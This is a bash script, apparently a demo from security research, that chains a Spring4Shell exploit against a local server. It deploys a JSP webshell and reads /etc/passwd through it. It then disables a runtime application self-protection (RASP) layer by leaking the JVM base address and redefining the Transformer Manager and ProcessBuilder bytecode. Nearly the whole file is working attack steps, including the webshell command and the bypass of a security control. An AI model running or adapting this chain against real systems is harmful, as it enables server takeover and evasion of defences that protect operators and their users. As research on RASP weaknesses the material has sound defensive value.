#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'  # No Color

echo -e "${RED}----Bypassing RASP using Instrumentation API [Spring4Shell] 😈-----------${NC}"

echo -e "${GREEN}Deploying Webshell...${NC}"
python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="exploit"
echo -e "\n"

sleep 12
res=$(curl "http://localhost:8080/exploit.jsp?cmd=cat%20/etc/passwd")
echo -e "\n${res}\n"
echo -e "${RED} 🧿 RASP blocked us from reading /etc/passwd file 😠"


# First lets get the jvm lib base address
echo -e "${GREEN} Reading base address of JVM library...${NC}"
sleep 10
python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="readBaseAddress"
sleep 10
base_address=$(curl "http://localhost:8080/readBaseAddress.jsp")
base_address="${base_address#"${base_address%%[![:space:]]*}"}"
base_address="${base_address%"${base_address##*[![:space:]]}"}"
echo -e "${YELLOW}Base address is ${base_address}...${NC}"
echo -e "\n"

# Redefine Transformer Manager
sleep 6
echo -e "${GREEN}Redefining Transformer Manager bytecode..${NC}"
python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="redefineTransformer"
sleep 6
curl "http://localhost:8080/redefineTransformer.jsp?cmd=${base_address}"
echo -e "\n"

sleep 7
echo -e "${GREEN}Redefining ProcessBuilder bytecode..${NC}"
python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="redefineProcessBuilder"
sleep 7
curl "http://localhost:8080/redefineProcessBuilder.jsp?cmd=${base_address}"
echo -e "\n"
sleep 7

echo -e "${GREEN}Running Exploit Again 👀...${NC}"
sleep 1
res=$(curl "http://localhost:8080/exploit.jsp?cmd=cat%20/etc/passwd")
echo -e "${res}\n"

